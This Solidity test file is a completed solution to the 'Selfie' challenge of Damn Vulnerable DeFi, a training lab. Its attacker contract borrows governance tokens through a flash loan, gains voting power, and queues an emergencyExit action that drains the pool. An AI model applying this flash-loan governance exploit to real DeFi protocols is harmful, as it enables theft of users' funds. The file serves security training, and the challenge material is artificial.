// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";
interface IERC20Approve is IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
}

contract SelfieChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 constant TOKENS_IN_POOL = 1_500_000e18;

    DamnValuableVotes token;
    SimpleGovernance governance;
    SelfiePool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableVotes(TOKEN_INITIAL_SUPPLY);

        // Deploy governance contract
        governance = new SimpleGovernance(token);

        // Deploy pool
        pool = new SelfiePool(token, governance);

        // Fund the pool
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(address(pool.governance()), address(governance));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(pool.maxFlashLoan(address(token)), TOKENS_IN_POOL);
        assertEq(pool.flashFee(address(token), 0), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_selfie() public checkSolvedByPlayer {
        SelfieAttacker attacker = new SelfieAttacker(pool, governance, token, recovery);

        uint256 actionId = attacker.attack(TOKENS_IN_POOL);

        vm.warp(block.timestamp + 2 days + 1);

        governance.executeAction(actionId);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player has taken all tokens from the pool
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
    }
}

/**
 * ATTACK CONTRACT - implements IERC3156FlashBorrower
 */
contract SelfieAttacker is IERC3156FlashBorrower {
    SelfiePool pool;
    SimpleGovernance governance;
    DamnValuableVotes token;
    address recovery;
    uint256 actionId;

    constructor(SelfiePool _pool, SimpleGovernance _governance, DamnValuableVotes _token, address _recovery) {
        pool = _pool;
        governance = _governance;
        token = _token;
        recovery = _recovery;
    }

    function attack(uint256 amount) external returns (uint256) {
        // Initiate flash loan - pool will call onFlashLoan() on this contract
        pool.flashLoan(this, address(token), amount, abi.encode(recovery));
        return actionId;
    }

   
    function onFlashLoan(
        address initiator,
        address token_,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external override returns (bytes32) {
        require(msg.sender == address(pool), "Not from pool");
        
        // Decode the recovery address
        address recoveryAddr = abi.decode(data, (address));

        // Delegate votes to ourselves to enable voting power
        token.delegate(address(this));

        // Queue governance action to call emergencyExit(recovery)
        // During this callback, we have voting power because we hold the tokens
        bytes memory callData = abi.encodeCall(pool.emergencyExit, (recoveryAddr));
        actionId = governance.queueAction(address(pool), 0, callData);

        // Approve pool to pull tokens back
        IERC20Approve(token_).approve(address(pool), amount + fee);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
